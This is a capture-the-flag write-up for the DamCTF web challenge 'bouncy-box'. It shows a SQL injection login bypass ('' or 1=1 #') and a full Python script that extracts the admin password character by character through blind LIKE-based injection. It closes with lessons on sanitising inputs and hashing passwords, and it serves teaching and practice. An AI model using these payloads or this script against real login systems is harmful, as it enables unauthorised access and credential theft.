---
layout: writeup
title: bouncy-box (web)
date: 2021-11-08
---
# Problem

We're given a URL to a website.  That's it, no source files here!

Let's see if we can hack it!

## Investigation
So the website is a weird jump-game which when we get a game-over prompts us to login to save our score.
 
Luckily, this prompt isn't sanitized so we can quickly SQL-inject our way past it with a class "`' or 1=1 #`".
 
![image of login prompt](/assets/writeup_imgs/bouncy-box0.png)
 
Past this prompt we see another user interface listing the players, their login privileges and a button saying "get flag"--which then prompts them to login again, except this prompt isn't susceptible to SQL injection!  From the high score we can determine the username of the website admin "boxy_mcbounce" but we can't figure out their password!
 
Luckily, since the first prompt is susceptible to SQL injection, we can utilize the LIKE operator and SQL wildcard character % to determine the admin's password. It takes a while (about a minute or two) but eventually we get the admin's password and can access the flag!

# Solution
```python
# Blind injection
import string
import requests

pwd = ''
url = 'https://bouncy-box.chals.damctf.xyz/login'

i = 0
# string.printable[66] is wildcard %--so stop before getting there.
while i < 66:
  payload = f"boxy_mcbounce' and password like '{pwd+string.printable[i]}%' #;"
  jsonData = {'username': payload, 'password': '', 'score': 0}
  r = requests.post(url, json=jsonData)
  if (r.status_code == 200):
    pwd += string.printable[i]
    print("password so far is ", pwd)
    print(payload)
    i = 0
  else:
    print(string.printable[i], "failed, status:", r.status_code)
    i += 1

print(pwd)
```

# Conclusion & Lessons Learned:
A system is only as strong as its weakest link--or something like that.  Remember to sanitize your sql inputs, store passwords as hashes, and don't reinvent the wheel if you can help it.